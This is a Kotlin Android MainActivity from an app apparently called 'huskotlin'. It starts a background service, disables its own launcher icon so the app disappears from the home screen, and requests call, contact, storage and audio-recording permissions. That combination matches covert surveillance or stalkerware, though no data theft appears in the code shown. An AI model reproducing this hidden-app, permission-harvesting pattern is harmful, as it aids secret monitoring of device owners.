package com.example.pc.huskotlin

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.SparseIntArray
import android.view.Surface

class MainActivity : Activity() {

    val MULTIPLE_PERMISSIONS = 10 // code you want.
    var permissions = arrayOf<String>(Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ScreenPreference.getInstance(this).saveFirstApp = false
        setContentView(R.layout.activity_main)
        val backgroundService = Intent(applicationContext, ScreenOnOffBackgroundService::class.java)
        startService(backgroundService)
        val p = packageManager
        val componentName = ComponentName(this@MainActivity, MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        if (checkPermissions()) {

        }
        ScreenPreference.getInstance(this).saveAppName = "false"

    }

    private fun checkPermissions(): Boolean {
        var result: Int
        val listPermissionsNeeded: ArrayList<String> = ArrayList()
        for (p in permissions) {
            result = ContextCompat.checkSelfPermission(this@MainActivity, p)
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p)
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toTypedArray(), MULTIPLE_PERMISSIONS)
            return false
        }
        return true
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        when (requestCode) {
            MULTIPLE_PERMISSIONS -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permissions granted.
                } else {
                    var perStr = ""
                    for (per in permissions) {
                        perStr += "\n" + per
                    }
                    // permissions list of don't granted permission
                }
                return
            }
        }
    }

    companion object {


        lateinit var instance: MainActivity
            private set
    }
}
